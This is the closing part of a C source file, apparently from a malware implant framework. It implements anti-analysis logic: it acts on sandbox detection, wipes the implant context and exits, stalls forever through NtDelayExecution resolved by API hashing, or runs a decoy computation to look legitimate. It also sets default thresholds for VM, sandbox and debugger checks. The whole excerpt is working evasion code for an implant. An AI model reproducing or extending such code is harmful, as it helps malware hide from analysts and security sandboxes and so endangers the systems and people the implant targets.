        ANALYSIS_RESULT sb_result;
        spec_memset(&sb_result, 0, sizeof(ANALYSIS_RESULT));
        DWORD sb_conf = antianalysis_check_sandbox(ctx, &sb_result);

        if (sb_conf >= cfg->sb_threshold) {
            result->type = ANALYSIS_SANDBOX;
            result->confidence = sb_conf;
            result->indicator_count = sb_result.indicator_count;
            spec_memcpy(result->indicators, sb_result.indicators,
                        sizeof(DWORD) * sb_result.indicator_count);
            return ANALYSIS_SANDBOX;
        }
    }

    return ANALYSIS_CLEAN;
}

/* ------------------------------------------------------------------ */
/*  Response handler                                                   */
/* ------------------------------------------------------------------ */

void antianalysis_respond(IMPLANT_CONTEXT *ctx, ANALYSIS_RESPONSE response) {
    switch (response) {
    case AA_RESPONSE_EXIT:
        /* Zero-fill implant context and terminate */
        if (ctx) {
            ctx->running = FALSE;
            spec_memset(ctx, 0, sizeof(IMPLANT_CONTEXT));
        }
        /* In PIC code, we return to the caller which should exit.
         * The zeroed ctx->running will cause the main loop to not start. */
        break;

    case AA_RESPONSE_SLEEP_FOREVER: {
        /* Infinite delay loop using NtDelayExecution.
         * Resolve it from ntdll and loop forever with 1-hour intervals. */
#ifndef TEST_BUILD
        typedef NTSTATUS (*PFN_NTDELAY)(BOOL, QWORD *);

        PVOID ntdll = find_module_by_hash(HASH_NTDLL_DLL);
        if (!ntdll) return;

        /* HASH_NTDELAYEXECUTION provided by syscalls.h */
        PFN_NTDELAY pDelay =
            (PFN_NTDELAY)find_export_by_hash(ntdll, HASH_NTDELAYEXECUTION);
        if (!pDelay) return;

        /* Negative value = relative time, 1 hour in 100-ns units */
        QWORD interval = (QWORD)-36000000000LL;
        while (1) {
            pDelay(FALSE, &interval);
        }
#else
        /* In test builds, just mark as not running */
        if (ctx) ctx->running = FALSE;
#endif
        break;
    }

    case AA_RESPONSE_DECOY: {
        /* Run a benign computation to appear as legitimate software */
        volatile DWORD result = 0;
        for (DWORD i = 0; i < 100000; i++)
            result += i;
        (void)result;
        /* Then exit */
        if (ctx) {
            ctx->running = FALSE;
            spec_memset(ctx, 0, sizeof(IMPLANT_CONTEXT));
        }
        break;
    }

    case AA_RESPONSE_IGNORE:
        /* No-op — continue execution */
        break;
    }
}

/* ------------------------------------------------------------------ */
/*  Default configuration                                              */
/* ------------------------------------------------------------------ */

void antianalysis_default_config(ANTIANALYSIS_CONFIG *cfg) {
    if (!cfg) return;

    cfg->response       = AA_RESPONSE_EXIT;
    cfg->vm_threshold   = 50;
    cfg->sb_threshold   = 50;
    cfg->dbg_threshold  = 50;
    cfg->check_vm       = TRUE;
    cfg->check_sandbox  = TRUE;
    cfg->check_debugger = TRUE;
}
